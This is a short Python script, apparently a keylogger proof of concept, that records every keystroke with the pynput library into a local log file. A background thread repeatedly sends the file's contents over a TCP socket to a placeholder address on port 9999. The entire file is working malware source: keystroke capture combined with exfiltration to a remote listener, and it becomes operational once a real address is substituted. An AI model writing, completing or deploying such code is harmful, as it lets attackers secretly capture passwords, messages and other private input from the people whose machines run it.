import socket
import threading
from pynput import keyboard

LOG_FILE = "keylog_poc.txt"
DUMMY_IP = "0.0.0.0"
PORT = 9999

def write_to_file(key):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(key + "\n")

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    write_to_file(k)

def send_data():
    while True:
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                data = f.read()
            if data:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                try:
                    sock.connect((DUMMY_IP, PORT))
                    sock.sendall(data.encode())
                except Exception:
                    pass
                sock.close()
        except FileNotFoundError:
            pass

threading.Thread(target=send_data, daemon=True).start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
